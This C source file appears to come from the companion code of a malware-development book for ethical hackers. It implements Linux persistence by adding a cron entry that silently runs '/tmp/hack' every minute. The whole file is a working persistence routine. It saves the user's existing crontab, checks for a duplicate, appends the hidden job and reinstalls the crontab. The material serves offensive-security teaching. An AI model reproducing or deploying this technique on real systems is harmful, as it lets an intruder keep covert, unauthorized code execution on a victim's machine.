/*
 * Malware Development for Ethical Hackers 2nd
 * 02-scheduled-tasks/pers.c
 * persistence via cron scheduled tasks
 * author: @cocomelonc
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
  // define the malicious cron entry
  // this entry runs our payload every minute
  // * * * * * = every minute, every hour, every day, etc.
  const char* payload_path = "/tmp/hack";
  const char* cron_entry = "* * * * * (/tmp/hack &) > /dev/null 2>&1";
  
  // create a temporary file to hold our new crontab
  char tmp_cron[128] = "/tmp/cron_XXXXXX";
  int fd = mkstemp(tmp_cron);
  if (fd == -1) {
    perror("failed to create temp file");
    return 1;
  }

  // export existing crontab tasks to our temp file
  // we redirect stderr to /dev/null in case no crontab exists
  char cmd[512];
  snprintf(cmd, sizeof(cmd), "crontab -l > %s 2>/dev/null", tmp_cron);
  system(cmd);

  // check if our payload is already scheduled
  FILE* f_read = fopen(tmp_cron, "r");
  char line[1024];
  int already_present = 0;
  while (fgets(line, sizeof(line), f_read)) {
    if (strstr(line, payload_path)) {
      already_present = 1;
      break;
    }
  }
  fclose(f_read);

  if (already_present) {
    printf("payload already in crontab. skipping. meow! =^..^=\n");
    unlink(tmp_cron);
    return 0;
  }

  // append the new cron job to the temp file
  FILE* f_append = fopen(tmp_cron, "a");
  if (f_append) {
    fprintf(f_append, "%s\n", cron_entry);
    fclose(f_append);
  }

  // install the updated crontab
  snprintf(cmd, sizeof(cmd), "crontab %s", tmp_cron);
  if (system(cmd) == 0) {
    printf("persistence successfully installed via cron\n");
  } else {
    printf("failed to install persistence via cron job\n");
  }

  // cleanup
  unlink(tmp_cron);
  return 0;
}